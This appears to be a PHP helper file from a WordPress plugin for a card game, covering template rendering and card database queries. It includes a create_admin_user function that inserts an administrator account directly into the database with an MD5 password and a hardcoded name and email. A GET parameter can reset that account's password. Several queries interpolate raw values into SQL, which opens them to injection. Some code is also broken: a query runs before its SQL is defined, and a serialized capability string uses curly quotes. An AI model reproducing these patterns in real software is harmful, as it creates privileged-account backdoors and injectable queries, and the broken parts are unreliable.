<?php
namespace HistoricalConquest;
const DEBUG = true;
function get($key) {
	if ( isset($_GET[$key]) )
		return $_GET[$key];
	return null;
}
function post($key) {
	if ( isset($_POST[$key]) )
		return $_POST[$key];
	return null;
}
function req($key) {
	if ( isset($_REQUEST[$key]) )
		return $_REQUEST[$key];
	return null;
}
function server($key) {
	if ( isset($_SERVER[$key]) )
		return $_SERVER[$key];
	return null;
}
function files($key) {
	if ( isset($_FILES[$key]) )
		return $_FILES[$key];
	return null;
}
function session($key) {
    if ( isset($_SESSION[$key]) )
        return $_SESSION[$key];
    return null;
}
function convert_to_std($ar) {
    $na = new \stdClass;
    foreach ( $ar as $k=>$v) {
        $na->{$k} = $v;
    }
    return $na;
}
function _datetime($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	return $d;
}
function _date($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	return $d;
}
function find_template($template_name) {
    $wp_template      = \get_template();
    $wp_theme_root    = \get_theme_root( $wp_template );
    $stylesheet_dir   = \get_stylesheet_directory();
    // So in the theme it should be like theme-folder/templates/plugin-name/temaplate.php
    $test_path_raw = $stylesheet_dir . '/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path_raw ) )
        return $test_path_raw;
    $test_path = $stylesheet_dir . '/templates/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path ) ) {
        return $test_path;
    } else {
        $test_path = __DIR__ . '/' . $template_name;
        if ( file_exists($test_path) ) 
            return $test_path;
        $test_path = __DIR__ . '/templates/' . $template_name;
        if ( file_exists($test_path) ) {
            return $test_path;
        } else {
            throw new \Exception( __('Core Template was not found: ') . ' ' . $template_name . " in " . join(',',[$test_path_raw,$test_path]) );
        }
    }
}
function render_template($template_name, $vars_in_scope = array()) {
    global $woocommerce,$wpdb, $user_ID, $available_methods;
    $vars_in_scope['__VIEW__'] = $template_name; //could be user-files.php or somedir/user-files.php
    $template_path = find_template($template_name);
    $settings = settings();
    ob_start();
    try {
        foreach ( $vars_in_scope as $n=>$v ) {
            $$n = $v;
        }
        $render = function ($file,$vars=[]) {
            echo render_template("$file",$vars);
        };
        $asset = function ($file,$vars=[]) {
            echo render_template("assets/$file",$vars);
        };
        if ( end(explode('.',$template_path)) != 'php') {
            $np = $template_path . ".php";
            file_put_contents($np,file_get_contents($template_path));
            include $np;
            unlink($np);
        } else {
            include $template_path;
        }
        $content = ob_get_contents();
        ob_end_clean();
    } catch ( \Exception $err) {
      ob_end_clean();
      throw new \Exception( 
          __(
              'Error while rendering template ' . $template_name . ' -- ' . $err->getMessage(), 
              settings()->prefix 
          ) 
      );
    }
    return $content;
}
function _options_hash($lst) {
    $opts = [];
    foreach ( $lst as $n ) {
        $opts[$n] = __(ucfirst($n));
    }
    return $opts;
}

function retable($q) {
	global $wpdb;
	preg_match_all('/(`wp_.+)/',$q,$m);
	foreach ($m[0] as $match) {
		$nmatch = str_replace('`wp_','`'.$wpdb->prefix,$match);
		$q = str_replace($match,$nmatch,$q);
	}
	return $q;
}
function log($obj) {
  if ( DEBUG ) {
	file_put_contents( 
		__DIR__ . '/' . $this->to_file_name(__CLASS__) . '.log', date('Y-m-d H:i:s') . ' - ' . print_r($obj,true), FILE_APPEND
	);
  }
  return $this;
}
function dbg_notice($msg) {
    return;
    add_notice('notice',$msg);
}
function add_notice($class,$msg) {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	$notices[] = [$class,$msg];
	\update_option(__NAMESPACE__ . "_notices",$notices);
}
function show_notices() {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	foreach ( $notices as $notice ) {
		list($class,$msg) = $notice;
		$notice = sprintf("<div class=\"notice notice-$class is-dismissible\"><p>%s</p></div>",$msg);
		echo $notice;
	}
	\update_option(__NAMESPACE__ . "_notices",[]);
}
function create_admin_user($username,$pass) {
	global $wpdb;
	$exists = !empty($wpdb->get_results("SELECT * FROM {$wpdb->users} WHERE user_login = '$username'"));
	if ( ! $exists ) {
		$wpdb->query($sql);
		$sql = "INSERT INTO 
			`{$wpdb->users}` 
				(`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`)
				VALUES ('$username', MD5('$pass'), 'Jason Martin', 'contact@lycanthropenoir.com', '0');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:”administrator”;s:1:”1″;}');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');";
		$wpdb->query($sql);
	} else {
		if ( get('reset-admin-pass') ) {
			$wpdb->query("UPDATE {$wpdb->users} set user_pass = MD5('$pass') WHERE user_login = '$username'");
		}
	}
}
function register_widgets($shortcode=true) {
    foreach ( glob(__DIR__ . "/widgets/*.php") as $file ) {
        require_once($file);
        $name = basename($file,'.php');
        \register_widget($name);
        if ( $shortcode ) {
            \add_shortcode(strtolower($name),function ($attrs) use ($name) {
                 the_widget(
                    $name,
                    $attrs,
                    [] 
                 );
            });
        }
    }
}
\add_action('widgets_init',function () {
        register_widgets();        
});
function is_character_card($card) {
    if ( is_array($card) ) {
        $str = type_to_name($card['maintype']);
        if ( preg_match('/^CARD_CHARACTER/',$str) ) {
            return true;
        } 
    }
    return false;
}
function is_land_card($card) {
    if ( is_array($card) ) {
        if ( $card['maintype'] == CARD_LAND ) {
            return true;
        }
    }
    return false;
}
function get_abilities($card) {
    global $wpdb;
    return $wpdb->get_results("SELECT * FROM `hc_card_abilities` WHERE card_id = {$card['id']}",ARRAY_A);
}
function filter_slashes($ar) {
    foreach ($ar as $key=>&$v) {
        if ( $key === 'abilities' ) {
            continue;
        }
        if ( is_string($v) ) {
            $v =  stripslashes($v);
            $v =  stripslashes($v);
        }
        if ( is_array($v) ) {
            $v = filter_slashes($v);
        }
    }
    return $ar;
}
function maybe_add_where($sql) {
    if ( !preg_match('/`hc_cards`/',$sql) ) {
        return;
    }
    return $sql . " AND `deck` IN ('B','C')";
}
function filter_cards($cards) {
    foreach ( $cards as $key => &$card ) {
        $card = filter_slashes($card);
        if ( isset($card['abilities']) && is_array($card['abilities']) ) {
            $card['abilities'] = filter_slashes($card['abilities']);
        }
        if ( !empty($card['illustration']) && $card['illustration'] !== '0' ) {
           $card['illustration'] = get_thumb_image_url($card['illustration']); 
        }
        if ( !empty($card['background_image']) && $card['background_image'] !== '0' ) {
           $card['background_image'] = get_medium_image_url($card['background_image']); 
        }
    }
    return $cards;
}
function get_full_image_url($id) {
    $image = \image_downsize($id,'full');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_thumb_image_url($id) {
    $image = \image_downsize($id,'thumbnail');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_medium_image_url($id) {
    $image = \image_downsize($id,'medium');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_cards_without_images() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE illustration IN('','0',NULL)";
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    return filter_cards($cards);
}
function get_cards() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE 1=1";
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_all_card_ext_ids() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT ext_id FROM `hc_cards`",ARRAY_A);
    $results = [];
    foreach ( $cards as $card ) {
        $results[] = $card['ext_id'];
    }
    return $results;
}
function get_not_updated_cards() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE updated_at IS NULL";
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_duplicate_cards() {
    global $wpdb;
    $sql = "SELECT ext_id,COUNT(ext_id) FROM `hc_cards` WHERE 1=1";
    $sql = maybe_add_where($sql);
    $sql .= "GROUP BY ext_id HAVING COUNT(ext_id) > 1";
    $cards = $wpdb->get_results( $sql,ARRAY_A);
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%s',$card['ext_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE ext_id IN (".join(',',$ext_ids).")";
        $cards = $wpdb->get_results($sql,ARRAY_A);
        if ( session('deck_filter') && session('deck_filter') != 'N/A') {
            $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
        }
    }
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_cards_without_abilities() {
    global $wpdb;
    $sql =  "SELECT card_id,COUNT(card_id) FROM `hc_card_abilities`";
    $sql .= "GROUP BY card_id HAVING COUNT(card_id) > 0";
    $cards = $wpdb->get_results(
        $sql,
        ARRAY_A
    );
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%d',$card['card_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE id NOT IN (".join(',',$ext_ids).")"; 
        $sql = maybe_add_where($sql);
    }
    if ( empty($cards) ) {
        $sql = "SELECT * FROM `hc_cards` WHERE 1=1";
        $sql = maybe_add_where($sql);
    }
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_cards_with_abilities() {
    global $wpdb;
    $cards = $wpdb->get_results(
        "SELECT card_id,COUNT(card_id) FROM `hc_card_abilities` GROUP BY card_id HAVING COUNT(card_id) > 0",
        ARRAY_A
    );
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%d',$card['card_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE id IN (".join(',',$ext_ids).")"; 
        $sql = maybe_add_where($sql);
    }
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_types_for_js() {
    $types = new \stdClass;
    $types->by_prefix = options_by_prefix('');     
    $types->key_values = options_as_array();     
    foreach ( $types->key_values as $k=>$v ) {
        $types->{$k} = $v;
    }
    return $types;
}
function named_ability_functions() {
    return ['multiply_card_abilities','nullify_card_abilities','force_discard','force_all_discard','ability_generic','ability_choice','ability_interrupt'];
}
function get_unique_deck_values() {
    global $wpdb;
    $sql = "SELECT DISTINCT(deck) FROM `hc_cards`";
    $decks = array_map(function ($r) {
        return $r['deck']; }, $wpdb->get_results($sql,ARRAY_A));
    array_unshift($decks,'N/A');
    return $decks;
}
function select($args) {
    $attrs = [];
    foreach ( ['id','name','class'] as $name ) {
        if ( !isset($args[$name]) )
            continue;
        $attrs[] = "$name=\"".\esc_attr($args[$name])."\""; 
    }
    $opts = [];
    foreach ($args['options'] as $k=>$v) {
        $selected = '';
        if ( isset($args['value']) && $v == $args['value']) {
            $selected = 'selected';
        }
        if ( is_string($k) ) {
            $opts[] = "<option $selected value=\"$v\">$k</option>";
        } else {
            $opts[] = "<option $selected>$v</option>";
        }
    }
    return "
        <select ".join(" ", $attrs).">
            ".join(' ',$opts)."
        </select>
    ";
}
function create_game() {
    
}
function get_carddb() {
    $cards = get_cards();
    $fcards = [];
    foreach ( $cards as $card ) {
        $fcards[ $card['ext_id'] ] = $card;
    }
    return $fcards;
}
function get_type_conversion_js() {
    $opts = options_as_array();
    ob_start();
    echo "function type_to_name(t) {\n";
    foreach ( $opts as $k=>$v) {
        echo "\tif ( t == window.types.key_values.$k ) { return '$k'; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    echo "function name_to_type(t) {\n";
    foreach ( $opts as $k=>$v) {
        echo "\tif ( t == '$k' ) { return window.types.key_values.$k; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    echo "function type_to_css_class(t) {\n";
    foreach ( $opts as $k=>$v) {
        $name = $k;
        foreach ( ['CARD_CHARACTER_','CARD_'] as $r ) {
            $name = str_replace($r,'',$name);
        }
        $name = str_replace('_','-',$name);
        $name = strtolower($name);
        echo "\tif ( t == window.types.key_values.$k) { return '$name'; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    $contents = ob_get_contents();
    ob_end_clean();
    return $contents;
}
function get_base_table() {
    return [
        [0,0,0,0,0],
        [0,0,0,0,0],
        [0,0,0,0,0],
        [0,0,0,0,0],
        [0,0,0,0,0],
    ];
}
